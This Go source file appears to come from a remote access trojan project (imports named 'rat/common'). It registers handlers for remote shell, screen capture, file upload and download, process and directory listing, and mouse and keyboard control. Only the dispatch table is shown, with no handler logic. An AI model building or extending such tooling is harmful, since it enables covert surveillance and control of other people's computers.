package main

import (
	"rat/common"
	"rat/network"
)

type PacketMap map[common.PacketHeader]network.IncomingPacket

var packets PacketMap

func init() {
	packets = make(PacketMap)
	packets[common.PingHeader] = PingPacket{}
	packets[common.SysHeader] = SysPacket{}
	packets[common.ScreenHeader] = ScreenPacket{}
	packets[common.ProcessHeader] = ProcessPacket{}
	packets[common.DirectoryHeader] = DirectoryPacket{}
	packets[common.PutFileHeader] = DownloadPacket{}
	packets[common.GetFileHeader] = UploadPacket{}
	packets[common.MouseMoveHeader] = MouseMovePacket{}
	packets[common.MouseHeader] = MousePacket{}
	packets[common.KeyHeader] = KeyPacket{}
	packets[common.FileHeader] = FilePacket{}
	packets[common.ShellHeader] = ShellPacket{}
	packets[common.WindowsHeader] = WindowsPacket{}
}

func GetIncomingPacket(header common.PacketHeader) network.IncomingPacket {
	return packets[header]
}
